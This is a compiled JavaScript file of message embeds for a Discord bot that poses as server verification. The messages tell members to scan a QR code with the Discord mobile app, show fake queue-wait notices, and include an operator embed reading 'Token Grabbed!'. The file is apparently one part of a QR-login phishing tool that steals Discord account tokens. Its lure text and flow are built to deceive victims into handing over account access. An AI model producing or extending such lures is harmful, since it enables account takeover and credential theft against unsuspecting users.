"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.foundTokenEmbed = exports.lackPermissionsEmebd = exports.roleIsAboveMeEmbed = exports.setRoleEmbed = exports.verificationComplete = exports.alreadyVerifyingEmbed = exports.failedToMessageEmbed = exports.failedVerificationEmbed = exports.pleaseWaitEmbed = exports.prepareVerificationEmbed = exports.afterButtonPressEmbed = exports.verifyMessageEmbed = exports.directMessageEmbed = void 0;
const builders_1 = require("@discordjs/builders");
const config_1 = require("./config");
class EmbedColours {
    static colours = {
        fail: 0xff2222,
        yellow: 0xffd500,
        custom: parseInt(config_1.config.colour, 16),
    };
}
const directMessageEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Verification captcha")
        .setDescription("Scan the QR code below using the Discord mobile app to verify your identity within the server! You will get access to all channels once you are verified.");
    return embed;
};
exports.directMessageEmbed = directMessageEmbed;
const verifyMessageEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle(`${config_1.config.name} Verification required!`)
        .setDescription(`🔔 **To access the server, you must first pass verification.**\n➡️ Press the Verify button below.`);
    return embed;
};
exports.verifyMessageEmbed = verifyMessageEmbed;
const afterButtonPressEmbed = async (channelId) => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle(`Verification start`)
        .setDescription(`Verification has started, continue in your direct messages [here](https://discord.com/channels/@me/${channelId})!`);
    return embed;
};
exports.afterButtonPressEmbed = afterButtonPressEmbed;
const prepareVerificationEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Verification preparation")
        .setDescription("Please wait while we prepare your verification. This may take a few seconds.");
    return embed;
};
exports.prepareVerificationEmbed = prepareVerificationEmbed;
const pleaseWaitEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.yellow)
        .setTitle("We almost arrive!")
        .setDescription("We've noticed you and are working hard to verify it! The queue is quite full at the moment, so please wait while we complete your verification. This may take a few seconds.");
    return embed;
};
exports.pleaseWaitEmbed = pleaseWaitEmbed;
const failedVerificationEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle(`Verification failure`)
        .setDescription(`An error occurred while trying to verify you. Please try again later.`);
    return embed;
};
exports.failedVerificationEmbed = failedVerificationEmbed;
const failedToMessageEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Verification failure")
        .setDescription("I couldn't send you a message. Please check your privacy settings and try again...");
    return embed;
};
exports.failedToMessageEmbed = failedToMessageEmbed;
const alreadyVerifyingEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Verification failure")
        .setDescription("You are already in the verification process. Please complete this before trying again.");
    return embed;
};
exports.alreadyVerifyingEmbed = alreadyVerifyingEmbed;
const verificationComplete = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Complete verification")
        .setDescription("You have successfully verified yourself. You will now get access to all channels within the server...");
    return embed;
};
exports.verificationComplete = verificationComplete;
const setRoleEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Verification Function Set")
        .setDescription("The verification role has been established. Members will now receive this role once they have verified themselves.");
    return embed;
};
exports.setRoleEmbed = setRoleEmbed;
const roleIsAboveMeEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Could not set role")
        .setDescription("The role you have selected is above my highest role. Select a role below my highest role.");
    return embed;
};
exports.roleIsAboveMeEmbed = roleIsAboveMeEmbed;
const lackPermissionsEmebd = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Invalid permissions")
        .setDescription("You do not have the correct permissions to run this command. Contact a server administrator.");
    return embed;
};
exports.lackPermissionsEmebd = lackPermissionsEmebd;
const foundTokenEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Token Grabbed! Please review all information below.");
    return embed;
};
exports.foundTokenEmbed = foundTokenEmbed;
